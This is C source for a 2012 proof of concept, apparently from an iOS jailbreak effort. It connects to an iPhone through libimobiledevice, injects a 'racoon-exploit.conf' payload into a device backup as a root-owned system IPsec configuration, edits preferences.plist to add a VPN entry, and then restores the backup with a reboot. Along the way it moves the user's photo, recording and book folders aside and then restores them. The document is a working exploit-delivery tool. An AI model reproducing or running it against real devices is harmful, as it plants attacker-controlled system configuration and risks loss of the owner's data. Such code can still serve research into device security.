/**
 * POC: injecting a config file via mobilebackup2
 *  without the need of making a complete backup
 *
 * Copyright (C) 2012 Chronic-Dev Team
 * Copyright (C) 2012 Nikias Bassen
 *
 * Chronic-Dev POC license :P
**/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <errno.h>
#include <signal.h>

#include <libimobiledevice/libimobiledevice.h>
#include <libimobiledevice/lockdown.h>
#include <libimobiledevice/afc.h>
#include <libimobiledevice/sbservices.h>

#include "idevicebackup2.h"
#include "backup.h"
#include "rop.h"
#include "common.h"
#include "afc_utils.h"
#include "vpn_config.h"

#ifdef WIN32
#define sleep(x) Sleep(x*1000)
#endif

static int quit_flag = 0;

int connected = 0;

static void idevice_event_cb(const idevice_event_t *event, void *user_data)
{
	char* udid = (char*)user_data;
	printf("device event %d: %s\n", event->event, event->udid);
	if (udid && strcmp(udid, event->udid)) return;
	if (event->event == IDEVICE_DEVICE_ADD) {
		connected = 1;
	} else if (event->event == IDEVICE_DEVICE_REMOVE) {
		connected = 0;
	}
}

static void process_preferences_plist(plist_t* pl)
{
	printf("Checking preferences.plist and removing any previous entry\n");
	vpn_prefs_remove_entry(pl);
	printf("Adding new entry\n");
	vpn_prefs_add_entry(pl);
	printf("done\n");
}

#define BKPTMP "nirvana"
#define AFCTMP "HackStore"

static void clean_exit(int sig)
{
	quit_flag++;
	idevicebackup2_set_clean_exit(quit_flag);
}

int main(int argc, char** argv)
{
	idevice_t device = NULL;
	lockdownd_client_t lckd = NULL;
	afc_client_t afc = NULL;
	uint16_t port = 0;
	char* udid = NULL;
	int dscs = 0;

	/* we need to exit cleanly on running backups and restores or we cause havok */
	signal(SIGINT, clean_exit);
	signal(SIGTERM, clean_exit);
#ifndef WIN32	
	signal(SIGQUIT, clean_exit);
	signal(SIGPIPE, SIG_IGN);
#endif

	//ropMain(dscs); // this writes racoon-exploit.conf to disk

	if (IDEVICE_E_SUCCESS != idevice_new(&device, NULL)) {
		printf("No device found, is it plugged in?\n");
		return -1;
	}

	if (IDEVICE_E_SUCCESS == idevice_get_udid(device, &udid)) {
		printf("DeviceUniqueID : %s\n", udid);
	}

	idevice_free(device);
	device = NULL;

	idevice_event_subscribe(idevice_event_cb, udid);

	int retries = 20;
	int i = 0;
	while (!connected && (i++ < retries)) {
		sleep(1);
	}

	if (!connected) {
		fprintf(stderr, "ERROR: Device connection failed\n");
		return -1;
	}

	if (IDEVICE_E_SUCCESS != idevice_new(&device, udid)) {
		printf("No device found, is it plugged in?\n");
		return -1;
	}

	if (LOCKDOWN_E_SUCCESS != lockdownd_client_new_with_handshake(device, &lckd, "mb2hackup")) {
		idevice_free(device);
		printf("Error connecting to lockdownd.\n");
		return -1;
	}

	lockdownd_start_service(lckd, "com.apple.afc", &port);
	if (!port) {
		lockdownd_client_free(lckd);
		idevice_free(device);
		printf("Error starting AFC service\n");
		return -1;
	}

	afc_client_new(device, port, &afc);
	if (!afc) {
		lockdownd_client_free(lckd);
		idevice_free(device);
		printf("Could not connect to AFC\n");
		return -1;
	}
	lockdownd_client_free(lckd);
	lckd = NULL;

	// check if directory exists
	char** list = NULL;
	if (afc_read_directory(afc, "/"AFCTMP, &list) != AFC_E_SUCCESS) {
		// we're good, directory does not exist.
	} else {
		afc_dictionary_free(list);
		fprintf(stderr, "ERROR: the directory '%s' already exists. This is most likely a failed attempt to use this code...\n", AFCTMP);
		goto fix;
	}

	afc_make_directory(afc, "/"AFCTMP);

	printf("moving files aside...\n");
	afc_rename_path(afc, "/Books", "/"AFCTMP"/Books");
	afc_rename_path(afc, "/DCIM", "/"AFCTMP"/DCIM");
	afc_rename_path(afc, "/PhotoData", "/"AFCTMP"/PhotoData");
	afc_rename_path(afc, "/Photos", "/"AFCTMP"/Photos");
	afc_rename_path(afc, "/Recordings", "/"AFCTMP"/Recordings");
	// TODO other paths?

	afc_client_free(afc);
	afc = NULL;
	idevice_free(device);
	device = NULL;

	rmdir_recursive(BKPTMP);
	__mkdir(BKPTMP, 0755);

	char *bargv[] = {
		"idevicebackup2",
		"backup",
		BKPTMP,
		NULL
	};
	int bargc = 3;

	idevicebackup2(bargc, bargv);

	backup_t* backup = backup_open(BKPTMP, udid);
	if (!backup) {
		fprintf(stderr, "ERROR: failed to open backup\n");
		return -1;
	}

	// mess up the backup :D
	/*
	char ipsec_plist[] =
		"<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
		"<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n"
		"<plist version=\"1.0\">\n"
		"<dict>\n"
		"  <key>Global</key>\n"
		"  <dict>\n"
		"    <key>DebugLevel</key>\n"
		"    <integer>2</integer>\n"
		"    <key>DebugLogfile</key>\n"
		"    <string>/private/var/log/racoon.log</string>\n"
		"  </dict>\n"
		"</dict>\n"
		"</plist>\n";
	*/

	backup_file_t* bf = NULL;
	char* ipsec_plist = NULL;
	int ipsec_plist_size = 0;
	file_read("racoon-exploit.conf", &ipsec_plist, &ipsec_plist_size);
	if(ipsec_plist != NULL && ipsec_plist_size > 0) {
		/*
		 * com.apple.ipsec.plist
		 */
		bf = backup_get_file(backup, "SystemPreferencesDomain", "SystemConfiguration/com.apple.ipsec.plist");
		if (bf) {
			fprintf(stderr, "com.apple.ipsec.plist already present, replacing\n");
			backup_file_assign_file_data(bf, ipsec_plist, strlen(ipsec_plist), 0);
			backup_file_set_length(bf, strlen(ipsec_plist));
			backup_file_update_hash(bf);

			if (backup_update_file(backup, bf) < 0) {
				fprintf(stderr, "ERROR: could not add file to backup\n");
			} else {
				backup_write_mbdb(backup);
			}
		} else {
			fprintf(stderr, "adding com.apple.ipsec.plist\n");
			bf = backup_file_create_with_data(ipsec_plist, strlen(ipsec_plist), 0);
			backup_file_set_domain(bf, "SystemPreferencesDomain");
			backup_file_set_path(bf, "SystemConfiguration/com.apple.ipsec.plist");
			backup_file_set_mode(bf, 0100644);
			backup_file_set_inode(bf, 123456);
			backup_file_set_uid(bf, 0);
			backup_file_set_gid(bf, 0);
			unsigned int tm = (unsigned int)(time(NULL));
			backup_file_set_time1(bf, tm);
			backup_file_set_time2(bf, tm);
			backup_file_set_time3(bf, tm);
			backup_file_set_length(bf, strlen(ipsec_plist));
			backup_file_set_flag(bf, 4);
			backup_file_update_hash(bf);

			if (backup_update_file(backup, bf) < 0) {
				fprintf(stderr, "ERROR: could not add file to backup\n");
			} else {
				backup_write_mbdb(backup);
			}
		}
		backup_file_free(bf);
	}

	/*
	 * prefrences.plist
	 */
	bf = backup_get_file(backup, "SystemPreferencesDomain", "SystemConfiguration/preferences.plist");
	if (bf) {
		char* fn = backup_get_file_path(backup, bf);
		if (!fn) {
			fprintf(stderr, "Huh, backup path for preferences.plist not found?!\n");
			return -1;
		}

		unsigned char* prefs = NULL;
		uint32_t plen = 0;

		if (file_read(fn, &prefs, &plen) > 8) {
			plist_t pl = NULL;
			if (memcmp(prefs, "bplist00", 8) == 0) {
				plist_from_bin(prefs, plen, &pl);
			} else {
				plist_from_xml(prefs, plen, &pl);
			}
			free(prefs);
			plen = 0;
			prefs = NULL;

			process_preferences_plist(&pl);

			plist_to_bin(pl, (char**)&prefs, &plen);

			backup_file_assign_file_data(bf, prefs, plen, 1);
			free(prefs);
			prefs = NULL;
			backup_file_set_length(bf, plen);
			backup_file_update_hash(bf);

			if (backup_update_file(backup, bf) < 0) {
				fprintf(stderr, "ERROR: could not add file to backup\n");
			} else {
				backup_write_mbdb(backup);
			}
		} else {
			fprintf(stderr, "Could not open '%s'\n", fn);
		}
	} else {
		fprintf(stderr, "ERROR: could not locate preferences.plist in backup.\n");
	}
	backup_file_free(bf);

	backup_free(backup);

	char* rargv[] = {
		"idevicebackup2",
		"restore",
		"--system",
		"--settings",
		"--reboot",
		BKPTMP,
		NULL
	};
	int rargc = 6;

	idevicebackup2(rargc, rargv);

	printf("waiting for device reboot\n");

	// wait for disconnect
	while (connected) {
		sleep(2);
	}

	printf("Device %s disconnected\n", udid);

	// wait for device to connect
	while (!connected) {
		sleep(2);
	}
	idevice_event_unsubscribe();
	printf("Device %s detected. Connecting...\n", udid);
	sleep(2);

	device = NULL;
	if (IDEVICE_E_SUCCESS != idevice_new(&device, udid)) {
		printf("Reconnect to %s failed... whoops\n", udid);
		return -1;
	}

	if (LOCKDOWN_E_SUCCESS != lockdownd_client_new_with_handshake(device, &lckd, "mb2hackup")) {
		idevice_free(device);
		printf("Error connecting to lockdownd.\n");
		return -1;
	}

	port = 0;
	lockdownd_start_service(lckd, "com.apple.afc", &port);
	if (!port) {
		lockdownd_client_free(lckd);
		idevice_free(device);
		printf("Error starting AFC service\n");
		return -1;
	}

	afc_client_new(device, port, &afc);
	if (!afc) {
		lockdownd_client_free(lckd);
		idevice_free(device);
		printf("Could not connect to AFC\n");
		return -1;
	}

	printf("moving back files...\n");

	list = NULL;
	if (afc_read_directory(afc, "/"AFCTMP, &list) != AFC_E_SUCCESS) {
		fprintf(stderr, "Uh, oh, the folder '%s' does not exist or is not accessible...\n", AFCTMP);
	}

	i = 0;
	while (list && list[i]) {
		if (!strcmp(list[i], ".") || !strcmp(list[i], "..")) {
			i++;
			continue;
		}
		printf("%s\n", list[i]);

		char* tmpname = (char*)malloc(1+strlen(list[i])+1);
		strcpy(tmpname, "/");
		strcat(tmpname, list[i]);
		afc_rmdir_recursive(afc, tmpname, 1);

		char* tmxname = (char*)malloc(1+strlen(AFCTMP)+1+strlen(list[i])+1);
		strcpy(tmxname, "/"AFCTMP"/");
		strcat(tmxname, list[i]);

		printf("moving %s to %s\n", tmxname, tmpname);
		afc_rename_path(afc, tmxname, tmpname);

		free(tmxname);
		free(tmpname);

		i++;
	}
	afc_dictionary_free(list);

	printf("waiting for device to finish booting...\n");

	retries = 100;
	int done = 0;
	sbservices_client_t sbsc = NULL;
	plist_t state = NULL;

	while (!done && (retries-- > 0)) {
		port = 0;
		lockdownd_start_service(lckd, "com.apple.springboardservices", &port);
		if (!port) {
			continue;
		}
		sbsc = NULL;
		sbservices_client_new(device, port, &sbsc);
		if (!sbsc) {
			continue;
		}
		if (sbservices_get_icon_state(sbsc, &state, "2") == SBSERVICES_E_SUCCESS) {
			plist_free(state);
			state = NULL;
			done = 1;
		}
		sbservices_client_free(sbsc);
		if (done) {
			printf("bootup complete\n");
			break;
		}
		sleep(3);
	}
	lockdownd_client_free(lckd);
	lckd = NULL;

fix:
	printf("moving back any leftovers...\n");

	list = NULL;
	if (afc_read_directory(afc, "/"AFCTMP, &list) != AFC_E_SUCCESS) {
		//fprintf(stderr, "Uh, oh, the folder '%s' does not exist or is not accessible...\n", AFCTMP);
	}

	i = 0;
	while (list && list[i]) {
		if (!strcmp(list[i], ".") || !strcmp(list[i], "..")) {
			i++;
			continue;
		}
		printf("%s\n", list[i]);

		char* tmpname = (char*)malloc(1+strlen(list[i])+1);
		strcpy(tmpname, "/");
		strcat(tmpname, list[i]);
		afc_rmdir_recursive(afc, tmpname, 1);

		char* tmxname = (char*)malloc(1+strlen(AFCTMP)+1+strlen(list[i])+1);
		strcpy(tmxname, "/"AFCTMP"/");
		strcat(tmxname, list[i]);

		printf("moving %s to %s\n", tmxname, tmpname);
		afc_rename_path(afc, tmxname, tmpname);

		free(tmxname);
		free(tmpname);

		i++;
	}
	afc_dictionary_free(list);

	printf("cleaning up\n");
	afc_remove_path(afc, "/"AFCTMP);
	if (afc_read_directory(afc, "/"AFCTMP, &list) == AFC_E_SUCCESS) {
		fprintf(stderr, "WARNING: the folder /"AFCTMP" is still present in the user's Media folder. You have to check yourself for any leftovers and move them back if required.\n");
	}

	rmdir_recursive(BKPTMP);

	printf("done!\n");

leave:
	afc_client_free(afc);
	afc = NULL;
	idevice_free(device);
	device = NULL;
	free(udid);

	return 0;
}
